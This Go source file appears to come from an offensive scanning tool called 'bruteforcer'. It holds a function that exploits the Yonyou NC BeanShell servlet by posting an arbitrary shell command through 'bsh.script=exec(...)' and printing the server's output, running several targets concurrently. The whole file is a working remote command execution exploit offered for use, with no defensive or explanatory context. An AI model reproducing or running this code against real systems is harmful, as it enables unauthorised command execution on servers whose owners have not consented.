package exp

import (
	"bruteforcer/Global"
	"fmt"
	"github.com/zhshch2002/goreq"
	"strings"
)

var YONYOUNCthreadN = 0

func YonYouNCEXP(host string, cmd string) {
wait:
	if YONYOUNCthreadN <= 5 {
		go func() {
			YONYOUNCthreadN++
			if Global.DBG {
				println(fmt.Sprintf("当前进程%v", YONYOUNCthreadN))
			}
			defer func() {
				YONYOUNCthreadN--
			}()
			host = strings.ReplaceAll(host, "https://", "")
			host = strings.ReplaceAll(host, "http://", "")
			host = fmt.Sprintf("http://%v/servlet/~ic/bsh.servlet.BshServlet", host)
			postreq := goreq.Post(host).SetClient(goreq.NewClient())
			postreq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			postreq.SetRawBody([]byte(fmt.Sprintf("bsh.script=exec(\"%v\")&bsh.servlet.output=raw", cmd)))
			resp := postreq.Do()
			if resp.Err == nil && resp.StatusCode == 200 {
				fmt.Printf("%v=%v->%v\n", host, cmd, resp.Text)
			}
		}()
	} else {
		goto wait
	}
}
